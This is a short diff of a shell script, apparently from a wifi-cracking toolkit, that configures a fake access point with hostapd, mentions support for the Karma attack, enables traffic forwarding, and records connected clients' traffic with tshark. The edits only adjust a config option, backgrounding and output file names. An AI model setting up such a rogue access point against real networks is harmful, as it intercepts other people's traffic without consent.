@@ -38,8 +38,6 @@ hw_mode=g
 channel=6
 driver=nl80211
 wmm_enabled=1
-ieee80211n=1
-
 
 ssid=$FAKEAP_ESSID
 # Yes, we support the Karm attack.
@@ -65,8 +63,8 @@ iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET" -j ACCEPT
 echo '1' > /proc/sys/net/ipv4/ip_forward
 
 # Start FakeAP
-hostapd "$CONFIG_FAKEAP_DIR"/wificrack-hostapd.conf -B
+hostapd "$CONFIG_FAKEAP_DIR/wificrack-hostapd.conf" -B &
 
 # Sniff
-tshark -i "$INTERFACE"  -w "$CONFIG_FAKEAP_DIR"/output.pcap -P
+tshark -i "$INTERFACE"  -w "$CONFIG_FAKEAP_DIR"/fakeap-output.pcap -P
 
